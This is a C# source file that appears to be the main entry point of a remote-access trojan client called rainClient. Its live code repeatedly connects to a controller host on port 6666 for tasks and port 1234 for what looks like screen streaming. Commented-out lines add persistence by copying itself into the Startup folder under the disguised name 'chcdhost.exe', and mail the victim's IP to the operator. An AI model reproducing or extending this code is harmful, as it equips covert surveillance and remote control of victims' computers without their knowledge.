using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using rainClient.threadSocket;

using System.IO;
using System.Windows.Forms;

namespace rainClient
{
    class Program
    {
        private static byte[] videoBuffer = new byte[99999];
        private static byte[] taskBuffer = new byte[99999999];

        static void Main(string[] args)
        {
            //загрузка в автозапуск 
            //отправка инфы на почту 
            //if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + "chcdhost.exe"))
            //    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + "chcdhost.exe");

            //try
            //{
            //    GO.sendMail(GO.parceIP("https://2ip.ru", "<big id=\"d_clip_button\">(.*)</big>"));
            //}
            //catch
            //{ }

            taskSocket tS = new taskSocket(taskBuffer);
            videoSocket vS = new videoSocket(videoBuffer);
            vS.sleep = 300;

            Task.Run(() => 
            {
                for (; ; )
                {
                    tS.startProces(GO.parceIP(GO.getDomain()), 6666);
                    //tS.startProces("127.0.0.1", 6666);
                    System.Threading.Thread.Sleep(1000);
                }
            });
            
            for (; ; )
            {
                vS.startProces(GO.parceIP(GO.getDomain()), 1234);
                //vS.startProces("127.0.0.1", 1234);
                System.Threading.Thread.Sleep(1000);
            }
        }
    }
}
